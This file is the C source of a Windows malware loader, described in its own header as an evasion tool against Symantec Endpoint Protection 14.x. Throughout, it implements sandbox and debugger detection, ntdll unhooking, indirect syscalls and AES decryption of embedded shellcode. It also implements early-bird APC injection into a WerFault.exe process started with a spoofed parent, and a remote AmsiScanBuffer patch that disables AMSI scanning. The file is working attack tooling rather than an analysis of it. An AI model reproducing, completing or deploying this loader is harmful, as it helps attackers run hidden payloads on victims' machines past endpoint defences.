/*
 * sep_loader.c - SEP 14.x evasion loader (x64, mingw-w64)
 *
 * Technique stack:
 *   1. Sandbox/analysis checks (RAM, CPU, disk, uptime, proc count, debugger)
 *   2. HalosGate: SSNs resolved from a CLEAN ntdll.dll read from disk
 *      (SEP's SysPlant userland hooks live in the in-memory copy only)
 *   3. perfow-style ntdll unhook: clean .text mapped over the live copy
 *      (defeats SysPlant.dll hooks on NtWriteVirtualMemory & co.)
 *   4. Indirect syscalls (jmp into a clean "syscall;ret" gadget in ntdll)
 *   5. AES-256-CBC shellcode decryption via BCrypt (OS crypto, no sig surface)
 *   6. Early-bird APC injection into WerFault.exe, PPID-spoofed to explorer.exe
 *   7. Remote AMSI patch (AmsiScanBuffer) in the injected process
 *      (defeats SEP's AMSI provider for post-exploitation script execution)
 *
 * Build: see build.sh
 */
#define _WIN32_WINNT 0x0A00
#define WINVER 0x0A00

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <bcrypt.h>
#include <stdio.h>
#include <string.h>

#include "payload.h"
#include "peparse.h"   /* PE64 export/stub parser - shared with test harness */

#ifdef _DEBUG
#define DBG(fmt, ...) do { char _b[256]; sprintf(_b, fmt, ##__VA_ARGS__); OutputDebugStringA(_b); } while (0)
#else
#define DBG(fmt, ...) do { } while (0)
#endif

/* ---------------- minimal structures ---------------- */

typedef struct _MINI_PEB_LDR {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} MINI_PEB_LDR;

typedef struct _MINI_LDR_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MINI_LDR_ENTRY;

/* ---------------- syscall machinery ---------------- */

volatile DWORD g_ssn = 0;
ULONG_PTR g_gadget = 0;   /* VA of a clean "syscall; ret" inside ntdll */

/* direct syscall - used during the unhook phase (SEP cannot hook our .text) */
__attribute__((naked)) void SysDirect(void) {
    __asm__ volatile(
        "mov %rcx, %r10\n\t"
        "movl g_ssn(%rip), %eax\n\t"
        "syscall\n\t"
        "ret\n\t");
}

/* indirect syscall - jmp into ntdll's clean "syscall; ret" gadget */
__attribute__((naked)) void SysIndirect(void) {
    __asm__ volatile(
        "mov %rcx, %r10\n\t"
        "movl g_ssn(%rip), %eax\n\t"
        "jmp *g_gadget(%rip)\n\t");
}

typedef NTSTATUS(NTAPI *fnNtAlloc)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI *fnNtWrite)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI *fnNtProtect)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI *fnNtApc)(HANDLE, PVOID, PVOID, PVOID, PVOID);
typedef NTSTATUS(NTAPI *fnNtResume)(HANDLE, PULONG);
typedef NTSTATUS(NTAPI *fnNtQuery)(HANDLE, LONG, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI *fnNtReadVM)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

enum { SSN_ALLOC, SSN_WRITE, SSN_PROTECT, SSN_APC, SSN_RESUME, SSN_QUERY, SSN_READVM, SSN_COUNT };
static DWORD ssns[SSN_COUNT];

__attribute__((noinline)) static NTSTATUS NtAlloc(HANDLE h, PVOID *b, ULONG_PTR z, PSIZE_T s, ULONG a, ULONG p) {
    g_ssn = ssns[SSN_ALLOC];
    return ((fnNtAlloc)SysIndirect)(h, b, z, s, a, p);
}
__attribute__((noinline)) static NTSTATUS NtWrite(HANDLE h, PVOID a, PVOID buf, SIZE_T n, PSIZE_T w) {
    g_ssn = ssns[SSN_WRITE];
    return ((fnNtWrite)SysIndirect)(h, a, buf, n, w);
}
__attribute__((noinline)) static NTSTATUS NtProtect(HANDLE h, PVOID *b, PSIZE_T s, ULONG p, PULONG o) {
    g_ssn = ssns[SSN_PROTECT];
    return ((fnNtProtect)SysIndirect)(h, b, s, p, o);
}
__attribute__((noinline)) static NTSTATUS NtProtectDirect(HANDLE h, PVOID *b, PSIZE_T s, ULONG p, PULONG o) {
    g_ssn = ssns[SSN_PROTECT];
    return ((fnNtProtect)SysDirect)(h, b, s, p, o);
}
__attribute__((noinline)) static NTSTATUS NtApc(HANDLE h, PVOID fn, PVOID s1, PVOID s2, PVOID s3) {
    g_ssn = ssns[SSN_APC];
    return ((fnNtApc)SysIndirect)(h, fn, s1, s2, s3);
}
__attribute__((noinline)) static NTSTATUS NtResume(HANDLE h, PULONG susp) {
    g_ssn = ssns[SSN_RESUME];
    return ((fnNtResume)SysIndirect)(h, susp);
}
__attribute__((noinline)) static NTSTATUS NtQuery(HANDLE h, LONG cls, PVOID info, ULONG len, PULONG ret) {
    g_ssn = ssns[SSN_QUERY];
    return ((fnNtQuery)SysIndirect)(h, cls, info, len, ret);
}
__attribute__((noinline)) static NTSTATUS NtReadVM(HANDLE h, PVOID a, PVOID buf, SIZE_T n, PSIZE_T got) {
    g_ssn = ssns[SSN_READVM];
    return ((fnNtReadVM)SysIndirect)(h, a, buf, n, got);
}

/* ---------------- helpers ---------------- */

/* volatile loads + noinline: defeats GCC IPA constant folding, which would
 * otherwise decode these tables at compile time and embed plaintext copies */
__attribute__((noinline)) static void sxdec(char *out, const unsigned char *enc, int len, unsigned char key) {
    const volatile unsigned char *e = enc;
    volatile unsigned char k = key;
    for (int i = 0; i < len; i++) out[i] = (char)(e[i] ^ k);
    out[len] = 0;
}

static WCHAR wlower(WCHAR c) { return (c >= L'A' && c <= L'Z') ? (WCHAR)(c + 32) : c; }

/* case-insensitive WCHAR vs decoded-char compare */
static int wceq(const WCHAR *w, const char *a) {
    while (*a) {
        if (!*w || wlower(*w) != *a) return 0;
        w++; a++;
    }
    return *w == 0;
}

static void towide(WCHAR *dst, const char *src) {
    while (*src) *dst++ = (WCHAR)(unsigned char)*src++;
    *dst = 0;
}

static void *peb(void) {
    void *p;
    __asm__ volatile("movq %%gs:0x60, %0" : "=r"(p));
    return p;
}

static void *find_module_base(const char *name) {
    MINI_PEB_LDR *ldr = *(MINI_PEB_LDR **)((char *)peb() + 0x18);
    LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
    for (LIST_ENTRY *e = head->Flink; e != head; e = e->Flink) {
        MINI_LDR_ENTRY *m = (MINI_LDR_ENTRY *)((char *)e - 0x10);
        if (m->BaseDllName.Length && wceq(m->BaseDllName.Buffer, name))
            return m->DllBase;
    }
    return NULL;
}

/* ---------------- perfow unhook (parsers live in peparse.h) ---------------- */
static void unhook_ntdll(void *liveBase, unsigned char *clean, DWORD textVA, DWORD textSize, DWORD textOff) {
    PVOID va = (char *)liveBase + textVA;
    ULONG_PTR region = textSize;
    ULONG old = 0;
    if (NtProtectDirect((HANDLE)-1, &va, &region, PAGE_EXECUTE_READWRITE, &old) != 0) return;
    memcpy(va, clean + textOff, textSize);
    va = (char *)liveBase + textVA;
    region = textSize;
    NtProtectDirect((HANDLE)-1, &va, &region, PAGE_EXECUTE_READ, &old);
}

/* ---------------- sandbox / analysis checks ---------------- */

static int looks_like_sandbox(void) {
    MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms) && ms.ullTotalPhys < 3ULL * 1024 * 1024 * 1024) return 1;

    SYSTEM_INFO si; GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return 1;

    ULARGE_INTEGER freeb, totalb, freebT;
    if (GetDiskFreeSpaceExW(L"C:\\", &freeb, &totalb, &freebT) && totalb.QuadPart < 60ULL * 1024 * 1024 * 1024) return 1;

    if (GetTickCount64() < 10 * 60 * 1000) return 1;

    /* PEB->BeingDebugged */
    unsigned char *p = (unsigned char *)peb();
    if (p[2]) return 1;

    /* ProcessDebugPort */
    DWORD64 port = 0; ULONG rl = 0;
    if (NtQuery((HANDLE)-1, 7, &port, sizeof(port), &rl) == 0 && port) return 1;

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 1;
    PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
    int count = 0;
    if (Process32FirstW(snap, &pe)) do { count++; } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    if (count < 40) return 1;   /* 40: cloud VMs / Server Core run leaner than desktops */

    return 0;
}

/* ---------------- injection target ---------------- */

static HANDLE find_explorer(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return NULL;
    PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
    HANDLE h = NULL;
    if (Process32FirstW(snap, &pe)) do {
        if (wceq(pe.szExeFile, name)) {
            h = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);
            break;
        }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return h;
}

/* ---------------- remote AMSI patch ---------------- */

static int rread(HANDLE h, void *addr, void *buf, SIZE_T n) {
    SIZE_T got = 0;
    return (NtReadVM(h, addr, buf, n, &got) == 0 && got == n);
}

static int req(const char *a, const unsigned char *w, int wlen) {
    int i;
    for (i = 0; i < wlen; i++) if (a[i] != (char)w[i]) return 0;
    return a[i] == 0;
}

static void *remote_export(HANDLE h, void *base, const char *fname, int flen) {
    unsigned char dos[0x40];
    if (!rread(h, base, dos, 0x40) || dos[0] != 'M' || dos[1] != 'Z') return NULL;
    DWORD e_lfanew = *(DWORD *)(dos + 0x3C);

    unsigned char nth[0x118];
    if (!rread(h, (char *)base + e_lfanew, nth, 0x118)) return NULL;
    if (*(DWORD *)nth != 0x00004550) return NULL;
    DWORD optOff = e_lfanew + 4 + 0x14;   /* sig + file header */
    DWORD expRva = *(DWORD *)(nth + 0x18 + 0x70);   /* optional hdr + datadir[0].VA */

    unsigned char ed[0x28];
    if (!rread(h, (char *)base + expRva, ed, 0x28)) return NULL;
    DWORD numNames = *(DWORD *)(ed + 0x18);
    DWORD nameRva  = *(DWORD *)(ed + 0x20);
    DWORD ordRva   = *(DWORD *)(ed + 0x24);
    DWORD funcRva  = *(DWORD *)(ed + 0x1C);
    if (!numNames || numNames > 0x10000) return NULL;

    unsigned char *names = (unsigned char *)VirtualAlloc(NULL, numNames * 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!names) return NULL;
    if (!rread(h, (char *)base + nameRva, names, numNames * 4)) { VirtualFree(names, 0, MEM_RELEASE); return NULL; }

    void *addr = NULL;
    for (DWORD i = 0; i < numNames; i++) {
        DWORD nrva = *(DWORD *)(names + i * 4);
        char nb[96];
        if (!rread(h, (char *)base + nrva, nb, sizeof(nb))) continue;
        nb[95] = 0;
        if (req(nb, (const unsigned char *)fname, flen)) {
            WORD ord = 0;
            rread(h, (char *)base + ordRva + i * 2, &ord, 2);
            DWORD frva = 0;
            rread(h, (char *)base + funcRva + ord * 4, &frva, 4);
            addr = (char *)base + frva;
            break;
        }
    }
    VirtualFree(names, 0, MEM_RELEASE);
    return addr;
}

static void *remote_module(HANDLE h, const char *name) {
    PROCESS_BASIC_INFORMATION pbi; ULONG rl = 0;
    if (NtQuery(h, 0, &pbi, sizeof(pbi), &rl) != 0 || !pbi.PebBaseAddress) return NULL;

    ULONG_PTR ldr = 0;
    if (!rread(h, (char *)pbi.PebBaseAddress + 0x18, &ldr, 8) || !ldr) return NULL;

    unsigned char lb[0x30];
    if (!rread(h, (void *)ldr, lb, 0x30)) return NULL;
    ULONG_PTR head = ldr + 0x10;
    ULONG_PTR flink = *(ULONG_PTR *)(lb + 0x10);

    for (int i = 0; i < 64 && flink && flink != head; i++) {
        ULONG_PTR entry = flink - 0x10;
        unsigned char ent[0x68];
        if (!rread(h, (void *)entry, ent, 0x68)) return NULL;
        USHORT len = *(USHORT *)(ent + 0x58);
        ULONG_PTR nbuf = *(ULONG_PTR *)(ent + 0x60);
        if (len && len < 64 && nbuf) {
            unsigned char nb[64];
            if (rread(h, (void *)nbuf, nb, len)) {
                nb[len] = 0;
                int match = 1;
                for (int j = 0; name[j]; j++) {
                    WCHAR c = *(WCHAR *)(nb + j * 2);
                    if (wlower(c) != name[j]) { match = 0; break; }
                }
                if (match) return (void *)(*(ULONG_PTR *)(ent + 0x30));
            }
        }
        flink = *(ULONG_PTR *)(ent + 0x10);
    }
    return NULL;
}

/* standard AmsiScanBuffer patch: mov eax, 0x80070057; ret */
static const unsigned char AMSI_PATCH[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

static void patch_remote_amsi(HANDLE h) {
    char amsi[16], scan[24];
    sxdec(amsi, S4, S4_LEN, S4_KEY);
    sxdec(scan, S5, S5_LEN, S5_KEY);

    void *base = remote_module(h, amsi);
    if (!base) { DBG("amsi.dll not loaded in target\n"); return; }

    void *fn = remote_export(h, base, scan, S5_LEN);
    if (!fn) { DBG("AmsiScanBuffer not found\n"); return; }

    PVOID va = fn;
    SIZE_T region = sizeof(AMSI_PATCH);
    ULONG old = 0;
    if (NtProtect(h, &va, &region, PAGE_EXECUTE_READWRITE, &old) != 0) return;
    SIZE_T written = 0;
    NtWrite(h, fn, (PVOID)AMSI_PATCH, sizeof(AMSI_PATCH), &written);
    va = fn;
    region = sizeof(AMSI_PATCH);
    NtProtect(h, &va, &region, PAGE_EXECUTE_READ, &old);
    DBG("AMSI patched in target\n");
}

/* ---------------- main flow ---------------- */

static int run(void) {
    char nb[32], path[64], werf[64], expl[16];

    /* decrypt string table entries we use early */
    sxdec(nb, S0, S0_LEN, S0_KEY);          /* ntdll.dll */

    if (looks_like_sandbox()) return 0;

    Sleep(1800 + (DWORD)(GetTickCount() % 2400));

    void *ntdllBase = find_module_base(nb);
    if (!ntdllBase) return 0;

    sxdec(path, S1, S1_LEN, S1_KEY);        /* C:\Windows\System32\ntdll.dll */

    /* read clean ntdll from disk */
    WCHAR wpath[128];
    towide(wpath, path);
    HANDLE hf = CreateFileW(wpath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                            NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;
    DWORD fsize = GetFileSize(hf, NULL);
    if (!fsize || fsize > 32 * 1024 * 1024) { CloseHandle(hf); return 0; }
    unsigned char *clean = (unsigned char *)VirtualAlloc(NULL, fsize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!clean) { CloseHandle(hf); return 0; }
    DWORD rd = 0;
    if (!ReadFile(hf, clean, fsize, &rd, NULL) || rd != fsize) { CloseHandle(hf); VirtualFree(clean, 0, MEM_RELEASE); return 0; }
    CloseHandle(hf);

    MY_DOS *dos = (MY_DOS *)clean;
    if (dos->e_magic != 0x5A4D) return 0;
    MY_NT64 *nt = (MY_NT64 *)(clean + dos->e_lfanew);
    if (nt->Signature != 0x00004550) return 0;

    /* resolve SSNs from the clean image (HalosGate) */
    static const unsigned char *zwn[SSN_COUNT] = { S6, S7, S8, S9, S10, S11, S12 };
    static const int zwn_len[SSN_COUNT] = { S6_LEN, S7_LEN, S8_LEN, S9_LEN, S10_LEN, S11_LEN, S12_LEN };
    static const int zwn_key[SSN_COUNT] = { S6_KEY, S7_KEY, S8_KEY, S9_KEY, S10_KEY, S11_KEY, S12_KEY };
    char zw[32];
    for (int i = 0; i < SSN_COUNT; i++) {
        sxdec(zw, zwn[i], zwn_len[i], zwn_key[i]);
        ssns[i] = resolve_ssn(clean, nt, zw);
        if (!ssns[i]) { VirtualFree(clean, 0, MEM_RELEASE); return 0; }
    }

    uint32_t textVA = 0, textSize = 0, textOff = 0;
    if (!locate_text(clean, nt, &textVA, &textSize, &textOff, &g_gadget, ntdllBase)) {
        VirtualFree(clean, 0, MEM_RELEASE);
        return 0;
    }

    /* unhook live ntdll with the clean .text (direct syscalls) */
    unhook_ntdll(ntdllBase, clean, textVA, textSize, textOff);

    /* decrypt payload with BCrypt */
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE key = NULL;
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return 0;
    unsigned char cmode[32] = { 0 };
    if (BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                          sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) return 0;
    if (BCryptGenerateSymmetricKey(alg, &key, NULL, 0, (PUCHAR)AES_KEY, sizeof(AES_KEY), 0) != 0) return 0;

    SIZE_T outLen = ENC_PAYLOAD_LEN;
    unsigned char *payload = (unsigned char *)VirtualAlloc(NULL, outLen + 16, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!payload) return 0;
    ULONG got = 0;
    NTSTATUS st = BCryptDecrypt(key, (PUCHAR)ENC_PAYLOAD, ENC_PAYLOAD_LEN, NULL, (PUCHAR)AES_IV,
                                sizeof(AES_IV), payload, (ULONG)outLen, &got, 0);
    BCryptDestroyKey(key);
    BCryptCloseAlgorithmProvider(alg, 0);
    if (st != 0 || got != outLen) { VirtualFree(payload, 0, MEM_RELEASE); return 0; }

    /* PPID spoof -> explorer.exe, spawn WerFault.exe suspended */
    sxdec(werf, S2, S2_LEN, S2_KEY);
    sxdec(expl, S3, S3_LEN, S3_KEY);

    WCHAR wwerf[128];
    towide(wwerf, werf);
    HANDLE hParent = find_explorer(expl);

    STARTUPINFOEXW si;
    memset(&si, 0, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
    if (!si.lpAttributeList) return 0;
    if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize)) return 0;
    if (hParent) {
        UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                  &hParent, sizeof(hParent), NULL, NULL);
    }

    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));
    if (!CreateProcessW(wwerf, NULL, NULL, NULL, FALSE,
                        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si.StartupInfo, &pi)) {
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        if (hParent) CloseHandle(hParent);
        return 0;
    }
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    if (hParent) CloseHandle(hParent);

    /* remote alloc -> write -> RX -> APC -> resume (all indirect syscalls) */
    PVOID remote = NULL;
    SIZE_T reg = outLen;
    if (NtAlloc(pi.hProcess, &remote, 0, &reg, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0)
        return 0;
    SIZE_T written = 0;
    if (NtWrite(pi.hProcess, remote, payload, outLen, &written) != 0 || written != outLen)
        return 0;
    PVOID rp = remote;
    reg = outLen;
    ULONG oldProt = 0;
    if (NtProtect(pi.hProcess, &rp, &reg, PAGE_EXECUTE_READ, &oldProt) != 0)
        return 0;

    if (NtApc(pi.hThread, remote, NULL, NULL, NULL) != 0)
        return 0;
    ULONG susp = 0;
    NtResume(pi.hThread, &susp);

    /* let WerFault initialize, then patch AMSI in the target */
    Sleep(2500);
    patch_remote_amsi(pi.hProcess);
    Sleep(15000);
    patch_remote_amsi(pi.hProcess);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nCmdShow;
    run();
    ExitProcess(0);
    return 0;
}
